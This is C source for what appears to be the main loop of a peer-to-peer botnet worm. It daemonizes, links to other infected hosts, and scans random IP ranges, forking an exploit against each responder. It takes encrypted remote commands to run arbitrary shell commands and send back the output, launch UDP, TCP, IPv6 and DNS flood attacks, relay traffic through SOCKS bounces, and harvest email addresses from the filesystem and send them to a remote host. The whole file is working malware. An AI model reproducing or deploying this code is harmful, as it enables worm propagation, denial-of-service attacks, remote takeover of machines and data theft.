	memset((void*)&initrec,0,sizeof(struct initsrv_rec));
	initrec.h.tag=0x70;
	initrec.h.len=0;
	initrec.h.id=0;
	cpbases=(unsigned long*)malloc(sizeof(unsigned long)*argc);
	if (cpbases == NULL) {
		printf("Insufficient memory\n");
		return 0;
	}
	for (bases=1;bases<argc;bases++) {
		cpbases[bases-1]=aresolve(argv[bases]);
		relay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));
	}
	numlinks=0;
	dup2(null,0);
	dup2(null,1);
	dup2(null,2);
	if (fork()) return 1;
#ifdef SCAN
	a=classes[rand()%(sizeof classes)];
	b=rand();
	c=0;
	d=0;
#endif
	signal(SIGCHLD,nas);
	signal(SIGHUP,nas);
	while (1) {
		static unsigned long timeout=0,timeout2=0,timeout3=0;
		char buf_[3000],*buf=buf_;
		int n=0,p=0;
		long l=0,i=0;
		unsigned long start=time(NULL);
		fd_set read;
		struct timeval tm;

		FD_ZERO(&read);
		if (udpserver.sock > 0) FD_SET(udpserver.sock,&read);
		udpserver.len=0;
		l=udpserver.sock;
		for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) {
			FD_SET(clients[n].sock,&read);
			clients[n].len=0;
			if (clients[n].sock > l) l=clients[n].sock;
		}
		memset((void*)&tm,0,sizeof(struct timeval));
		tm.tv_sec=2;
		tm.tv_usec=0;
		l=select(l+1,&read,NULL,NULL,&tm);

		if (l == -1) {
			if (errno == EINTR) {
				for (i=0;i<	fuckyou;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
					unsigned int *newpids,on;
					for (on=i+1;on<fuckyou;on++) pids[on-1]=pids[on];
					pids[on-1]=0;
					fuckyou--;
					newpids=(unsigned int*)malloc((fuckyou+1)*sizeof(unsigned int));
					if (newpids != NULL) {
						for (on=0;on<fuckyou;on++) newpids[on]=pids[on];
						FREE(pids);
						pids=newpids;
					}
				}
			}
			continue;
		}
		timeout+=time(NULL)-start;
		if (timeout >= 60) {
			if (links == NULL || numlinks == 0) {
				memset((void*)&initrec,0,sizeof(struct initsrv_rec));
				initrec.h.tag=0x70;
				initrec.h.len=0;
				initrec.h.id=0;
				for (i=0;i<bases;i++) relay(cpbases[i],(char*)&initrec,sizeof(struct initsrv_rec));
			}
			else if (!myip) {
				memset((void*)&initrec,0,sizeof(struct initsrv_rec));
				initrec.h.tag=0x74;
				initrec.h.len=0;
				initrec.h.id=0;
				segment(2,(char*)&initrec,sizeof(struct initsrv_rec));
			}
			timeout=0;
		}
		timeout2+=time(NULL)-start;
		if (timeout2 >= 3) {
			struct mqueue *getqueue=queues;
			while(getqueue != NULL) {
				if (time(NULL)-getqueue->time > gettimeout()) {
					struct mqueue *l=getqueue->next;
					delqueue(getqueue->id);
					delqueue(getqueue->id);
					getqueue=l;
					continue;
				}
				else if ((time(NULL)-getqueue->ltime) >= (getqueue->destination?6:3)) {
					struct ainst ts;
					char srv[256];
					unsigned char i;
					memset((void*)&ts,0,sizeof(struct ainst));
					getqueue->ltime=time(NULL);
					if (getqueue->destination) {
						conv(srv,256,getqueue->destination);
						audp_relay(&udpserver,&ts,srv,getqueue->port);
						audp_send(&ts,getqueue->packet,getqueue->len);
					}
					else for (i=0;i<getqueue->trys;i++) segment(0,getqueue->packet,getqueue->len);
				}
				getqueue=getqueue->next;
			}
			timeout2=0;
		}
		timeout3+=time(NULL)-start;
		if (timeout3 >= 60*10) {
			char buf[2]={0,0};
			syncmode(1);
			pudbroadcast(buf,1);
			timeout3=0;
		}

		if (udpserver.sock > 0 && FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;

		for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;

#ifdef SCAN
		if (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {
			char srv[256];
			if (d == 255) {
				if (c == 255) {
					a=classes[rand()%(sizeof classes)];
					b=rand();
					c=0;
				}
				else c++;
				d=0;
			}
			else d++;
			memset(srv,0,256);
			sprintf(srv,"%d.%d.%d.%d",a,b,c,d);
			clients[n].ext=time(NULL);
			atcp_sync_connect(&clients[n],srv,SCANPORT);
			p++;
		}
		for (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {
			p=atcp_sync_check(&clients[n]);
			if (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);
			if (p == ASUCCESS) {
				char srv[256];
				conv(srv,256,clients[n].in.sin_addr.s_addr);
				if (mfork() == 0) {
					exploit(srv);
					exit(0);
				}
			}
		}
#endif
		for (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {
			if (clients[n].ext2 == TCP_PENDING) {
				struct add_rec rc;
				memset((void*)&rc,0,sizeof(struct add_rec));
				p=atcp_sync_check(&clients[n]);
				if (p == ACONNECT) {
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					FREE(clients[n].ext);
					FREE(clients[n].ext5);
					atcp_close(&clients[n]);
				}
				if (p == ASUCCESS) {
					rc.h.tag=0x43;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					clients[n].ext2=TCP_CONNECTED;
					if (clients[n].ext5) {
						atcp_send(&clients[n],clients[n].ext5,9);
						clients[n].ext2=SOCKS_REPLY;
					}
				}
			}
			else if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {
				struct add_rec rc;
				memset((void*)&rc,0,sizeof(struct add_rec));
				l=atcp_recv(&clients[n],buf,3000);
				if (*buf == 0) clients[n].ext2=TCP_CONNECTED;
				else {
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					FREE(clients[n].ext);
					FREE(clients[n].ext5);
					atcp_close(&clients[n]);
				}
			}
			else if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {
				struct data_rec rc;
				memset((void*)&rc,0,sizeof(struct data_rec));
				l=atcp_recv(&clients[n],buf+sizeof(struct data_rec),3000-sizeof(struct data_rec));
				if (l == AUNKNOWN) {
					struct kill_rec rc;
					memset((void*)&rc,0,sizeof(struct kill_rec));
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));
					FREE(clients[n].ext);
					FREE(clients[n].ext5);
					atcp_close(&clients[n]);
				}
				else {
					l=clients[n].len;
					rc.h.tag=0x41;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					rc.h.len=l;
					_encrypt(buf+sizeof(struct data_rec),l);
					memcpy(buf,(void*)&rc,sizeof(struct data_rec));
					relayclient((struct ainst *)clients[n].ext,buf,l+sizeof(struct data_rec));
				}
			}
		}

		if (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,buf,3000)) {
			struct llheader *llrp, ll;
			struct header *tmp;
			in++;
			if (udpserver.len < 0 || udpserver.len < sizeof(struct llheader)) continue;
			buf+=sizeof(struct llheader);
			udpserver.len-=sizeof(struct llheader);
			llrp=(struct llheader *)(buf-sizeof(struct llheader));
			tmp=(struct header *)buf;
			if (llrp->type == 0) {
				memset((void*)&ll,0,sizeof(struct llheader));
				if (llrp->checksum != in_cksum(buf,udpserver.len)) continue;
				if (!usersa(llrp->id)) addrsa(llrp->id);
				else continue;
				ll.type=1;
				ll.checksum=0;
				ll.id=llrp->id;
				if (tmp->tag != 0x26) audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));
			}
			else if (llrp->type == 1) {
				delqueue(llrp->id);
				continue;
			}
			else continue;
			if (udpserver.len >= sizeof(struct header)) {
				switch(tmp->tag) {
					case 0x20: { // Info
						struct getinfo_rec *rp=(struct getinfo_rec *)buf;
						struct info_rec rc;
						if (udpserver.len < sizeof(struct getinfo_rec)) break;
						memset((void*)&rc,0,sizeof(struct info_rec));
						rc.h.tag=0x47;
						rc.h.id=tmp->id;
						rc.h.seq=newseq();
						rc.h.len=0;
#ifdef SCAN
						rc.a=a;
						rc.b=b;
						rc.c=c;
						rc.d=d;
#endif
						rc.ip=myip;
						rc.uptime=time(NULL)-uptime;
						rc.in=in;
						rc.out=out;
						rc.version=VERSION;
						rc.reqtime=rp->time;
						rc.reqmtime=rp->mtime;
						relayclient(&udpclient,(char*)&rc,sizeof(struct info_rec));
						} break;
					case 0x21: { // Open a bounce
						struct add_rec *sr=(struct add_rec *)buf;
						if (udpserver.len < sizeof(struct add_rec)) break;
						for (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {
							char srv[256];
							if (sr->socks == 0) conv(srv,256,sr->server);
							else conv(srv,256,sr->socks);
							clients[n].ext2=TCP_PENDING;
							clients[n].ext3=sr->h.id;
							clients[n].ext=(struct ainst*)malloc(sizeof(struct ainst));
							if (clients[n].ext == NULL) {
								clients[n].sock=0;
								break;
							}
							memcpy((void*)clients[n].ext,(void*)&udpclient,sizeof(struct ainst));
							if (sr->socks == 0) {
								clients[n].ext5=NULL;
								atcp_sync_connect(&clients[n],srv,sr->port);
							}
							else {
								clients[n].ext5=(char*)malloc(9);
								if (clients[n].ext5 == NULL) {
									clients[n].sock=0;
									break;
								}
								((char*)clients[n].ext5)[0]=0x04;
								((char*)clients[n].ext5)[1]=0x01;
								((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];
								((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];
								((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];
								((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];
								((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];
								((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];
								((char*)clients[n].ext5)[8]=0x00;
								atcp_sync_connect(&clients[n],srv,1080);
							}
							if (sr->bind) abind(&clients[n],sr->bind,0);
							break;
						}
						} break;
					case 0x22: { // Close a bounce
						struct kill_rec *sr=(struct kill_rec *)buf;
						if (udpserver.len < sizeof(struct kill_rec)) break;
						for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
							FREE(clients[n].ext);
							FREE(clients[n].ext5);
							atcp_close(&clients[n]);
						}
						} break;
					case 0x23: { // Send a message to a bounce
						struct data_rec *sr=(struct data_rec *)buf;
						if (udpserver.len < sizeof(struct data_rec)+sr->h.len) break;
						for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
							_decrypt(buf+sizeof(struct data_rec),sr->h.len);
							atcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);
						}
						} break;
#ifndef LARGE_NET
					case 0x24: { // Run a command
						FILE *f;
						struct sh_rec *sr=(struct sh_rec *)buf;
						int id;
						if (udpserver.len < sizeof(struct sh_rec)+sr->h.len || sr->h.len > 2999-sizeof(struct sh_rec)) break;
						id=sr->h.id;
						(buf+sizeof(struct sh_rec))[sr->h.len]=0;
						_decrypt(buf+sizeof(struct sh_rec),sr->h.len);
						f=popen(buf+sizeof(struct sh_rec),"r");
						if (f != NULL) {
							while(1) {
								struct data_rec rc;
								char *str;
								unsigned long len;
								memset(buf,0,3000);
								fgets(buf,3000,f);
								if (feof(f)) break;
								len=strlen(buf);
								memset((void*)&rc,0,sizeof(struct data_rec));
								rc.h.tag=0x41;
								rc.h.seq=newseq();
								rc.h.id=id;
								rc.h.len=len;
								_encrypt(buf,len);
								str=(char*)malloc(sizeof(struct data_rec)+len);
								if (str == NULL) break;
								memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
								memcpy((void*)(str+sizeof(struct data_rec)),buf,len);
								relayclient(&udpclient,str,sizeof(struct data_rec)+len);
								FREE(str);
							}
							pclose(f);
						}
						else senderror(&udpclient,id,"Unable to execute command");
						} break;
#endif
					case 0x25: {
						} break;
					case 0x26: { // Route
						struct route_rec *rp=(struct route_rec *)buf;
						unsigned long i;
						if (udpserver.len < sizeof(struct route_rec)) break;
						if (!useseq(rp->h.seq)) {
							addseq(rp->h.seq);
							audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));

							if (rp->sync == 1 && rp->links != numlinks) {
								if (time(NULL)-synctime > 60) {
									if (rp->links > numlinks) {
										memset((void*)&initrec,0,sizeof(struct initsrv_rec));
										initrec.h.tag=0x72;
										initrec.h.len=0;
										initrec.h.id=0;
										relayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));
									}
									else syncm(&udpclient,0x71,0);
									synctime=time(NULL);
								}
							}
							if (rp->sync != 3) {
								rp->sync=1;
								rp->links=numlinks;
							}

							if (rp->server == -1 || rp->server == 0 || rp->server == myip) relay(inet_addr("127.0.0.1"),buf+sizeof(struct route_rec),rp->h.len-sizeof(struct route_rec));

							if (rp->server == -1 || rp->server == 0) segment(2,buf,rp->h.len);
							else if (rp->server != myip) {
								if (rp->hops == 0 || rp->hops > 16) relay(rp->server,buf,rp->h.len);
								else {
									rp->hops--;
									segment(2,buf,rp->h.len);
								}
							}

							for (i=LINKS;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));
							memset((struct route_table*)&routes[0],0,sizeof(struct route_table));
							routes[0].id=rp->h.id;
							routes[0].ip=udpclient.in.sin_addr.s_addr;
							routes[0].port=htons(udpclient.in.sin_port);
						}
						} break;
					case 0x27: {
						} break;
					case 0x28: { // List
						struct list_rec *rp=(struct list_rec *)buf;
						if (udpserver.len < sizeof(struct list_rec)) break;
						syncm(&udpclient,0x46,rp->h.id);
						} break;
					case 0x29: { // Udp flood
						int flag=1,fd,i=0;
						char *str;
						struct sockaddr_in in;
						time_t start=time(NULL);
						struct udp_rec *rp=(struct udp_rec *)buf;
						if (udpserver.len < sizeof(struct udp_rec)) break;
						if (rp->size > 9216) {
							senderror(&udpclient,rp->h.id,"Size must be less than or equal to 9216\n");
							break;
						}
						if (!isreal(rp->target)) {
							senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
							break;
						}
						if (waitforqueues()) break;
						str=(char*)malloc(rp->size);
						if (str == NULL) break;
						for (i=0;i<rp->size;i++) str[i]=rand();
						memset((void*)&in,0,sizeof(struct sockaddr_in));
						in.sin_addr.s_addr=rp->target;
						in.sin_family=AF_INET;
						in.sin_port=htons(rp->port);
						while(1) {
							if (rp->port == 0) in.sin_port = rand();
							if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
							else {
								flag = fcntl(fd, F_GETFL, 0);
								flag |= O_NONBLOCK;
								fcntl(fd, F_SETFL, flag);
								sendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));
								close(fd);
							}
							if (i >= 50) {
								if (time(NULL) >= start+rp->secs) exit(0);
								i=0;
							}
							i++;
						}
						FREE(str);
						} exit(0);
					case 0x2A: { // Tcp flood
						int flag=1,fd,i=0;
						struct sockaddr_in in;
						time_t start=time(NULL);
						struct tcp_rec *rp=(struct tcp_rec *)buf;
						if (udpserver.len < sizeof(struct tcp_rec)) break;
						if (!isreal(rp->target)) {
							senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
							break;
						}
						if (waitforqueues()) break;
						memset((void*)&in,0,sizeof(struct sockaddr_in));
						in.sin_addr.s_addr=rp->target;
						in.sin_family=AF_INET;
						in.sin_port=htons(rp->port);
						while(1) {
							if (rp->port == 0) in.sin_port = rand();
							if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
							else {
								flag = fcntl(fd, F_GETFL, 0);
								flag |= O_NONBLOCK;
								fcntl(fd, F_SETFL, flag);
								connect(fd, (struct sockaddr *)&in, sizeof(in));
								close(fd);
							}
							if (i >= 50) {
								if (time(NULL) >= start+rp->secs) exit(0);
								i=0;
							}
							i++;
						}
						} exit(0);
#ifndef NOIPV6
					case 0x2B: { // IPv6 Tcp flood
						int flag=1,fd,i=0,j=0;
						struct sockaddr_in6 in;
						time_t start=time(NULL);
						struct tcp6_rec *rp=(struct tcp6_rec *)buf;
						if (udpserver.len < sizeof(struct tcp6_rec)) break;
						if (waitforqueues()) break;
						memset((void*)&in,0,sizeof(struct sockaddr_in6));
						for (i=0;i<4;i++) for (j=0;j<4;j++) ((char*)&in.sin6_addr.s6_addr[i])[j]=((char*)&rp->target[i])[j];
						in.sin6_family=AF_INET6;
						in.sin6_port=htons(rp->port);
						while(1) {
							if (rp->port == 0) in.sin6_port = rand();
							if ((fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0);
							else {
								flag = fcntl(fd, F_GETFL, 0);
								flag |= O_NONBLOCK;
								fcntl(fd, F_SETFL, flag);
								connect(fd, (struct sockaddr *)&in, sizeof(in));
								close(fd);
							}
							if (i >= 50) {
								if (time(NULL) >= start+rp->secs) exit(0);
								i=0;
							}
							i++;
						}
						} exit(0);
#endif
					case 0x2C: { // Dns flood
						struct dns {
							unsigned short int id;
							unsigned char  rd:1;
							unsigned char  tc:1;
							unsigned char  aa:1;
							unsigned char  opcode:4;
							unsigned char  qr:1;
							unsigned char  rcode:4;
							unsigned char  unused:2;
							unsigned char  pr:1;
							unsigned char  ra:1;
							unsigned short int que_num;
							unsigned short int rep_num;
							unsigned short int num_rr;
							unsigned short int num_rrsup;
							char buf[128];
						} dnsp;
						unsigned long len=0,i=0,startm;
						int fd,flag;
						char *convo;
						struct sockaddr_in in;
						struct df_rec *rp=(struct df_rec *)buf;
						time_t start=time(NULL);
						if (udpserver.len < sizeof(struct df_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct df_rec)) break;
						if (!isreal(rp->target)) {
							senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
							break;
						}
						if (waitforqueues()) break;
						memset((void*)&in,0,sizeof(struct sockaddr_in));
						in.sin_addr.s_addr=rp->target;
						in.sin_family=AF_INET;
						in.sin_port=htons(53);
						dnsp.rd=1;
						dnsp.tc=0;
						dnsp.aa=0;
						dnsp.opcode=0;
						dnsp.qr=0;
						dnsp.rcode=0;
						dnsp.unused=0;
						dnsp.pr=0;
						dnsp.ra=0;
						dnsp.que_num=256;
						dnsp.rep_num=0;
						dnsp.num_rr=0;
						dnsp.num_rrsup=0;
						convo=buf+sizeof(struct df_rec);
						convo[rp->h.len]=0;
						_decrypt(convo,rp->h.len);
						for (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {
							convo[i]=0;
							sprintf(dnsp.buf+len,"%c%s",(unsigned char)(i-startm),convo+startm);
							len+=1+strlen(convo+startm);
							startm=i+1;
						}
						dnsp.buf[len++]=0;
						dnsp.buf[len++]=0;
						dnsp.buf[len++]=1;
						dnsp.buf[len++]=0;
						dnsp.buf[len++]=1;
						while(1) {
							dnsp.id=rand();
							if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
							else {
								flag = fcntl(fd, F_GETFL, 0);
								flag |= O_NONBLOCK;
								fcntl(fd, F_SETFL, flag);
								sendto(fd,(char*)&dnsp,sizeof(struct dns)+len-128,0,(struct sockaddr*)&in,sizeof(in));
								close(fd);
							}
							if (i >= 50) {
								if (time(NULL) >= start+rp->secs) exit(0);
								i=0;
							}
							i++;
						}
						} exit(0);
					case 0x2D: { // Email scan
						char ip[256];
						struct escan_rec *rp=(struct escan_rec *)buf;
						if (udpserver.len < sizeof(struct escan_rec)) break;
						if (!isreal(rp->ip)) {
							senderror(&udpclient,rp->h.id,"Invalid IP\n");
							break;
						}
						conv(ip,256,rp->ip);
						if (mfork() == 0) {
							struct _linklist *getb;
							struct ainst client;
							StartScan("/");
							audp_setup(&client,(char*)ip,ESCANPORT);
							getb=linklist;
							while(getb != NULL) {
								unsigned long len=strlen(getb->name);
								audp_send(&client,getb->name,len);
								getb=getb->next;
							}
							audp_close(&client);
							exit(0);
						}
						} break;
					case 0x70: { // Incomming client
						struct {
							struct addsrv_rec a;
							unsigned long server;
						} rc;
						struct myip_rec rp;
						if (!isreal(udpclient.in.sin_addr.s_addr)) break;

						syncmode(3);
						memset((void*)&rp,0,sizeof(struct myip_rec));
						rp.h.tag=0x73;
						rp.h.id=0;
						rp.ip=udpclient.in.sin_addr.s_addr;
						relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));

						memset((void*)&rc,0,sizeof(rc));
						rc.a.h.tag=0x71;
						rc.a.h.id=0;
						rc.a.h.len=sizeof(unsigned long);
						rc.server=udpclient.in.sin_addr.s_addr;
						pudbroadcast((void*)&rc,sizeof(rc));
						syncmode(1);

						addserver(rc.server);
						syncm(&udpclient,0x71,0);
						} break;
					case 0x71: { // Receive the list
						struct addsrv_rec *rp=(struct addsrv_rec *)buf;
						struct next_rec { unsigned long server; };
						unsigned long a;
						char b=0;
						if (udpserver.len < sizeof(struct addsrv_rec)) break;
						for (a=0;rp->h.len > a*sizeof(struct next_rec) && udpserver.len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {
							struct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));
							addserver(fc->server);
						}
						for (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;
						if (!b && isreal(udpclient.in.sin_addr.s_addr)) {
							struct myip_rec rp;
							memset((void*)&rp,0,sizeof(struct myip_rec));
							rp.h.tag=0x73;
							rp.h.id=0;
							rp.ip=udpclient.in.sin_addr.s_addr;
							relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));
							addserver(udpclient.in.sin_addr.s_addr);
						}
						} break;
					case 0x72: { // Send the list
						syncm(&udpclient,0x71,0);
						} break;
					case 0x73: { // Get my IP
						struct myip_rec *rp=(struct myip_rec *)buf;
						if (udpserver.len < sizeof(struct myip_rec)) break;
						if (!myip && isreal(rp->ip)) {
							myip=rp->ip;
							addserver(rp->ip);
						}
						} break;
					case 0x74: { // Transmit their IP
						struct myip_rec rc;
						memset((void*)&rc,0,sizeof(struct myip_rec));
						rc.h.tag=0x73;
						rc.h.id=0;
						rc.ip=udpclient.in.sin_addr.s_addr;
						if (!isreal(rc.ip)) break;
						relayclient(&udpclient,(void*)&rc,sizeof(struct myip_rec));
						} break;
					case 0x41:   //  --|
					case 0x42:   //    |
					case 0x43:   //    |
					case 0x44:   //    |---> Relay to client
					case 0x45:   //    |
					case 0x46:   //    |
					case 0x47: { //  --|
						unsigned long a;
						struct header *rc=(struct header *)buf;
						if (udpserver.len < sizeof(struct header)) break;
						if (!useseq(rc->seq)) {
							addseq(rc->seq);
							for (a=0;a<LINKS;a++) if (routes[a].id == rc->id) {
								struct ainst ts;
								char srv[256];
								conv(srv,256,routes[a].ip);
								audp_relay(&udpserver,&ts,srv,routes[a].port);
								relayclient(&ts,buf,udpserver.len);
								break;
							}
						}
						} break;
				}
			}
		}
	}
	audp_close(&udpserver);
	return 0;
}
